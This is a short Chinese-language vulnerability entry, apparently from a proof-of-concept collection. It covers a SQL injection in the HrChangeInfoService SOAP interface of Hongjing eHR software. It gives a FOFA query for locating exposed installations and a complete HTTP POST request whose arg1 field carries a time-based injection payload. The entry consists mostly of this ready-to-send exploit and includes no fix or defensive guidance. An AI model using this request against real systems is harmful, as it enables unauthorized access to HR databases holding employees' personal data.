## 宏景eHR HrChangeInfoService SQL注入漏洞

## 漏洞描述
宏景eHR `HrChangeInfoService` 接口存在 SQL 注入，攻击者可执行任意查询或命令。

## 网络空间测绘
```
fofa: app="HJSOFT-HCM"
```

## POC
```
POST /services/HrChangeInfoService HTTP/1.1
Host: [请补充实际域名]
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/xml
Connection: close

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:hr="http://www.hjsj.com/HrChangeInfoService">
  <soapenv:Header/>
  <soapenv:Body>
    <hr:getChangeUsers>
      <arg0></arg0>
      <arg1>1';WAITFOR DELAY '0:0:5'--</arg1>
      <arg2>1</arg2>
    </hr:getChangeUsers>
  </soapenv:Body>
</soapenv:Envelope>
```

## 参考
- 社区情报

